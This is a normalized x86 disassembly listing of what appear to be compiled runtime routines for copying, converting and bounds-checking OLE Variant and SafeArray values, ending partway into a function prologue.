mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f624
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40efcc
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40f274
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40f274
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f640
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f670
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f274
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40f274
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f8a0
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f5a8
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40f274
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404174
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_41670c
test al al
je r-xdata
mov ecx sub_40f898
mov edx esi
mov eax ebx
call sub_40f6cc
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40f274
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f94c
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f8a0
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f5a8
sub_40f990
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx esi
je r-xdata
push esi
push ebx
call VariantCopyInd
call sub_40f274
pop esi
pop ebx
retn
mov eax ebx
call sub_40f624
sub_40f9c0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov edx esp
mov ax [ ebx ]
call sub_41670c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f990
push 0x1
mov ecx ebx
mov edx esi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_40f9f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40fbbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
and edx 0xffffbfff
cmp edx 0x14
ja r-xdata
test ah 0x20
je r-xdata
jmp [ edx * 4 + jump_table_40fa29 ]
mov edx ebx
mov eax esi
call sub_40f9c0
mov ecx sub_40f9b8
mov edx ebx
mov eax esi
call sub_40f6cc
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xfe
call sub_413a2c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0xfc
call sub_413a2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_413c24
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_413c24
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
mov eax esi
call sub_413c4c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_413c24
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40f9b0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_413cdc
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov dx [ edx ]
neg dx
sbb edx edx
neg edx
call sub_413bfc
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xff
call sub_413a2c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x1
call sub_413a2c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x2
call sub_413a2c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0x4
call sub_413a2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
push eax
mov eax esi
call sub_413b28
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fbcc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f990
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fbc4
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
sub_40fbe0
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x8 ]
call sub_404f48
mov esi eax
mov eax ebx
call sub_40f624
mov [ ebx ] 0x8
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40fc08
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fc64
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f94c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40fe90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fc6b
lea eax [ ebp - 0x10 ]
call sub_40f624
retn
sub_40fc74
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fcb2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4132dc
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413cdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fcb9
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
sub_40fcc0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fcfe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412bb4
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413c60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fd05
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40fd0c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fd4a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413980
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413d40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fd51
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_40fd58
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fd96
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4138b4
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413d14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fd9d
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_40fda4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40fe90
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40f280
jmp r-xdata
mov edx esi
call sub_40edec
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40f280
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40fe24
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_41670c
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40fc08
jmp r-xdata
mov edx esp
mov eax esi
call sub_41670c
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40fda4
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40fe90
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f94c
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fe90
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fed5 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40fcc0
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40f38c
jmp r-xdata
mov eax ebx
call sub_4107fc
mov edx eax
mov eax esi
call sub_413b08
jmp r-xdata
mov eax ebx
call sub_410254
mov edx eax
mov eax esi
call sub_413a68
jmp r-xdata
mov eax ebx
call sub_411bc0
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413b54
jmp r-xdata
mov eax ebx
call sub_411828
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413b78
jmp r-xdata
mov eax ebx
call sub_412500
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413ba4
jmp r-xdata
mov eax ebx
call sub_411f98
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413bd0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40fc74
jmp r-xdata
mov eax ebx
call sub_411314
mov edx eax
mov eax esi
call sub_413bfc
jmp r-xdata
mov eax ebx
call sub_4106a4
mov edx eax
mov eax esi
call sub_413ae8
jmp r-xdata
mov eax ebx
call sub_410754
mov edx eax
mov eax esi
call sub_413a88
jmp r-xdata
mov eax ebx
call sub_4108f4
mov edx eax
mov eax esi
call sub_413aa8
jmp r-xdata
mov eax ebx
call sub_4109cc
mov edx eax
mov eax esi
call sub_413ac8
jmp r-xdata
mov eax ebx
call sub_410d18
push edx
push eax
mov eax esi
call sub_413b28
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40fd0c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40fd58
jmp r-xdata
mov dx 0x101
call sub_40edec
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f624
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40fe24
xor edx edx
mov ax 0x1
call sub_40edec
jmp r-xdata
sub_4100bc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41015f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4132dc
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4043a8
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408750
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410166
lea eax [ ebp - 0xc ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_40482c
retn
mov eax ebx
call sub_411314
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40f280
jmp r-xdata
sub_410170
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40f280
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_4101ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410200
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f94c
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_410254
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410207
lea eax [ ebp - 0x14 ]
call sub_40f624
retn
sub_410210
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41670c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_410254
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410675
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410287 ]
mov eax [ ebp - 0x4 ]
call sub_4100bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b60
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b60
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402b60
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b60
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4100bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410254
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410170
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4101ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40edec
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_410210
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_410170
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_410170
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_4104ab ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b60
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b60
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402b60
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b60
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4100bc
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410254
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032d0
sub_4106a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40edec
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_410730
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410254
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032d0
sub_410754
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40edec
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_4107d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410254
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032d0
sub_4107fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_4108d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410254
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_410822 ]
jmp [ eax * 4 + jump_table_410834 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032d0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40edec
sub_4108f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_4109a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410254
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_410916 ]
jmp [ eax * 4 + jump_table_410929 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032d0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40edec
sub_4109cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_410a91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410d18
test edx edx
je r-xdata
mov al [ eax + lookup_table_4109f2 ]
jmp [ eax * 4 + jump_table_410a06 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032d0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40edec
sub_410ab4
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402b60
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40f280
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_411314
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_410b60
push ebp
mov ebp esp
add esp 0xffffffe4
